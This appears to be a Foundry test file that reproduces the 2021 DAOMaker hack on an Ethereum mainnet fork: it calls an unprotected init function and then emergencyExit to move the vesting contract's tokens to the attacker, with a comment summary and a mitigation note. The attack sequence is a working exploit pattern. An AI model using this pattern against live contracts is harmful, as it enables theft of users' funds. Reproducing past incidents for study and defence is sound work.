// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../TestHarness.sol";
import {IERC20} from '../interfaces/IERC20.sol';

// forge test --match-contract Exploit_DAOMaker -vvv
/*
On Sept 03, 2021 an attacker stole over 4MM USD in various tokens from an DAOMaker.
In the twitter thread shown below, Mudit Gupta suggests that the attacker was using a browser wallet
as the calls where made separeterly without a contract and the browser wallet built-in swap was used.
Also, the contract attacked was not verified. The fact that the attacker used only an EOA to perform the attack
on a non verified contract suggests that the attacker was aware of this vulnerability.
The attacker called init on a non access controlled contract and called emergencyExit withdrawing the tokens held.

// Attack Overview
Total Lost: ~4MM usd on several transactions
Attack Tx: https://etherscan.io/tx/0x96bf6bd14a81cf19939c0b966389daed778c3a9528a6c5dd7a4d980dec966388, https://etherscan.io/tx/0x96bf6bd14a81cf19939c0b966389daed778c3a9528a6c5dd7a4d980dec966388

Exploited Contract: https://etherscan.io/address/0x2FD602Ed1F8cb6DEaBA9BEDd560ffE772eb85940
Attacker Address: https://etherscan.io/address/0x2708cace7b42302af26f1ab896111d87faeff92f
Attack Block:  13155350 

// Key Info Sources
Twitter: https://twitter.com/Mudit__Gupta/status/1434059922774237185


Principle: Non access control init function

ATTACK:
1) Call init again with malicious parameters
2) Call emergencyExit withdrawing the tokens

MITIGATIONS:
1) Access control the initialization and prevent re-initialization of a contract.

*/

interface DAOMaker {
    function init(uint256 _start, uint256[] calldata _releasePeriods, uint256[] calldata _releaseDate, address _token) external;
    function emergencyExit(address receiver) external;
}

contract Exploit_DAOMaker is TestHarness {
    address internal attacker = 0x2708CACE7b42302aF26F1AB896111d87FAEFf92f;
    DAOMaker internal daomaker = DAOMaker(0x2FD602Ed1F8cb6DEaBA9BEDd560ffE772eb85940);
    IERC20 internal derc = IERC20(0x9fa69536d1cda4A04cFB50688294de75B505a9aE);

    function setUp() external {
        cheat.createSelectFork('mainnet', 13155349);
    }

    function test_attack() external {
        console.log('------- STEP 0: INITIAL BALANCE -------');
        emit log_named_decimal_uint('Attacker DERC', derc.balanceOf(attacker), derc.decimals());
        console.log('\n');

        console.log('------- STEP 1: INITIALIZATION -------');
        uint256 initBlock = block.number;

        uint256 start = 1640984401;

        uint256[] memory releasePeriods = new uint256[](1);
        releasePeriods[0] = 5702400;

        uint256[] memory releasePercents = new uint256[](1);
        releasePercents[0] = 10000;

        cheat.prank(attacker);
        daomaker.init(start, releasePeriods, releasePercents, address(derc));
       
        console.log('Current Block:', initBlock);
        emit log_named_decimal_uint('Attacker DERC', derc.balanceOf(attacker), derc.decimals());
        console.log('\n');
        
        console.log('------- STEP 2: DERC EXIT -------');
        cheat.rollFork(initBlock + 1);
        console.log('Current Block:', block.number);

        cheat.prank(attacker);
        daomaker.emergencyExit(attacker);

        emit log_named_decimal_uint('Attacker DERC', derc.balanceOf(attacker), derc.decimals());

    }


}